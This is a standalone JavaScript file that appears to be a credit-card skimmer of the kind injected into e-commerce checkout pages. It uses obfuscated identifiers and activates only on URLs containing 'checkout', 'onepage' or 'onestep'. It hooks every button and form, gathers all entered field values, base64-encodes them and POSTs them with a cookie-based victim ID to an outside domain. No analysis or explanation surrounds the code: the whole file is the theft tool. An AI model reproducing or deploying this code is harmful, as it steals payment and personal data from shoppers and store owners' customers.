var q7a4017129bd636cf0f3b338959953270={
    snd:null,
    u1bee840f230f9955e81da97125bdbc69:'https://web.archive.org/web/20181213191423/https://cmytuok.top/js/common.js',
    myid:(function(name){
        var matches=document.cookie.match(new RegExp('(?:^|; )'+name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,'\\$1')+'=([^;]*)'));
        return matches?decodeURIComponent(matches[1]):undefined;
    })('setidd')||(function(){
        var ms=new Date();
        var myid = ms.getTime()+"-"+Math.floor(Math.random()*(999999999-11111111+1)+11111111);
        var date=new Date(new Date().getTime()+60*60*24*1000);
        document.cookie='setidd='+myid+'; path=/; expires='+date.toUTCString();
        return myid;
    })(),
clk:function(){
        q7a4017129bd636cf0f3b338959953270.snd=null;
        var inp=document.querySelectorAll("input, select, textarea, checkbox, button");
        for (var i=0;i<inp.length;i++){
            if(inp[i].value.length>0){
                var nme=inp[i].name;
                if(nme==''){nme=i;}
                    q7a4017129bd636cf0f3b338959953270.snd+=inp[i].name+'='+inp[i].value+'&';
            }
        }
    },
    send:function(){
        try{
            var btn=document.querySelectorAll("a[href*='javascript:void(0)'],button, input, submit, .btn, .button");
            for(var i=0;i<btn.length;i++){
                var b=btn[i];
                if(b.type!='text'&&b.type!='select'&&b.type!='checkbox'&&b.type!='password'&&b.type!='radio'){
                    if(b.addEventListener) {
                        b.addEventListener('click',q7a4017129bd636cf0f3b338959953270.clk,false);
                    }else{
                        b.attachEvent('onclick',q7a4017129bd636cf0f3b338959953270.clk);
                    }
                }
            }
            var frm=document.querySelectorAll('form');
            for(vari=0;i<frm.length;i++){
                if(frm[i].addEventListener){
                    frm[i].addEventListener('submit',q7a4017129bd636cf0f3b338959953270.clk,false);
                }else{
                    frm[i].attachEvent('onsubmit',q7a4017129bd636cf0f3b338959953270.clk);
                }
            }
            if(q7a4017129bd636cf0f3b338959953270.snd!=null){
                var domm=location.hostname.split('.').slice(0).join('_')  || 'nodomain';
                var keym=btoa(q7a4017129bd636cf0f3b338959953270.snd);
                var http=new XMLHttpRequest();
                http.open('POST',q7a4017129bd636cf0f3b338959953270.u1bee840f230f9955e81da97125bdbc69,true);
                http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
                http.send('info='+keym+'&hostname='+domm+'&key='+q7a4017129bd636cf0f3b338959953270.myid);
            }
            q7a4017129bd636cf0f3b338959953270.snd=null;
            keym=null;
            setTimeout(function(){q7a4017129bd636cf0f3b338959953270.send()},30);
        }catch(e){}
    }
}

if((new RegExp('onepage|checkout|onestep','gi')).test(window.location)){
	q7a4017129bd636cf0f3b338959953270.send();
}
